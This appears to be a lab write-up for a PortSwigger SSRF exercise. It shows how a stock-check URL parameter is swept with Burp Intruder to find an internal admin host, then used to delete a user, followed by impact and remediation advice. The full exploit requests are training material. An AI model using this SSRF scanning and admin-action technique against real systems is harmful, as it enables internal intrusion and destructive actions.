# Basic SSRF against another back-end system

**Category:** SSRF
**Level:** Apprentice
**Mechanism:** SSRF as an internal network/port scanner — reach another back-end host

**Lab URL:** https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

---

## Vulnerability

The stock-check feature fetches a user-supplied URL server-side (`stockApi`). Because
the request originates from the server, it can reach hosts on the internal network that
the client cannot. By iterating the target IP, the application becomes a **scanner** for
internal services — here finding an unauthenticated admin interface on another back-end
host and using it to delete a user.

## Reconnaissance & Exploitation

The `POST /product/stock` request carries a full URL in `stockApi`. Pointing it at an
arbitrary internal host confirmed the SSRF reaches the internal range, and the response
codes distinguished live from dead hosts:

```
stockApi=http://192.168.0.1:8080/admin   → 500 (host up, but not the admin / errors)
(missing stockApi)                        → 400 "Missing parameter"
```

To find the admin host I sent the request to **Burp Intruder**, marked the final octet
of the IP as the payload position, and swept it with Numbers 1–255:

```
stockApi=http://192.168.0.§1§:8080/admin     (Intruder: Numbers 1→255)
```

Sorting results by status code surfaced the one live admin interface — `192.168.0.87`
returned `200` while the rest returned `500`:

```
payload 87  → 200 OK   (admin interface: delete links for wiener, carlos)
all others  → 500 / 400
```

I sent that request to Repeater and changed the path to the delete endpoint:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.87:8080/admin/delete?username=carlos
```

```http
HTTP/2 302 Found
Location: http://192.168.0.87:8080/admin
```

carlos deleted — lab solved. The server made the internal request on my behalf, so the
admin panel on another back-end host was reachable despite being invisible externally.

## Impact

SSRF turns the public app into a pivot for **internal reconnaissance and attack**: an
attacker enumerates live hosts and open ports across the internal range (`192.168.0.0/24`
here), discovers unauthenticated internal services, and acts on them — in this case
deleting users via a hidden admin panel. The same technique maps internal networks,
reaches databases/management interfaces, and hits cloud metadata — a serious breach
vector from a single "check stock" field.

## Remediation

- Do not let user input define the host the server connects to. Use an allowlist of
  exact, expected endpoints and reject anything else.
- Block internal/private ranges (RFC 1918: `10/8`, `172.16/12`, `192.168/16`),
  loopback, and link-local — validated **after** DNS resolution to defeat rebinding.
- Segment the network and require authentication on internal admin interfaces so a
  reached service is not automatically an exploitable one (the admin panel here had no
  auth — a second flaw).

## References

- **OWASP:** A10:2021 Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918 (Server-Side Request Forgery)

## Notes

- SSRF + Intruder = internal port/host scanner. Mark the IP octet (or port) as the
  payload position and sweep; status/length/time differences reveal live services.
- Read the status codes as a map: `400` = request shape wrong (missing param), `500` =
  host reached but no valid service there, `200` = live target. The single `200` in a
  sea of `500`s is the find.
- Builds on lab 01 (SSRF → localhost): same sink, but here the target is **another**
  internal host, showing SSRF's reach across the whole internal network, not just the
  server itself.